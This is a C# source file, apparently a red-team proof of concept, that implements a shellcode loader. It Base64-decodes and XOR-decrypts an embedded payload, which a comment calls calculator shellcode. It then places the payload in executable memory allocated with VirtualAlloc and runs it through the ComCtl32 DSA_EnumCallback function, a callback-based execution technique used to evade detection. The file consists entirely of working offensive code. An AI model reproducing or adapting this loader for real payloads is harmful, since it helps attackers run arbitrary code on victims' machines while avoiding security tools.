using System;
using System.Runtime.InteropServices;

namespace AltCallbacks
{
    class Callback
    {
        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        const int DA_LAST = 0x7FFFFFFF;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("ComCtl32.dll")]
        static extern IntPtr DSA_Create(int cbItem, int cItemGrow);

        [DllImport("ComCtl32.dll")]
        static extern void DSA_InsertItem(IntPtr hdsa, int i, IntPtr pitem);

        [DllImport("ComCtl32.dll")]
        static extern void DSA_EnumCallback(IntPtr hdsa, IntPtr pfnCB, IntPtr pData);

        [DllImport("ComCtl32.dll")]
        static extern bool DSA_Destroy(IntPtr hdsa);

        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            IntPtr myHDSA = IntPtr.Zero;

            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);
            
            myHDSA = DSA_Create(1, 1);

            // Append item
            DSA_InsertItem(myHDSA, DA_LAST, myHDSA);

            // Callback function
            DSA_EnumCallback(myHDSA, p, IntPtr.Zero);

            // Cleanup
            DSA_Destroy(myHDSA);

            return;
        }
    }
}
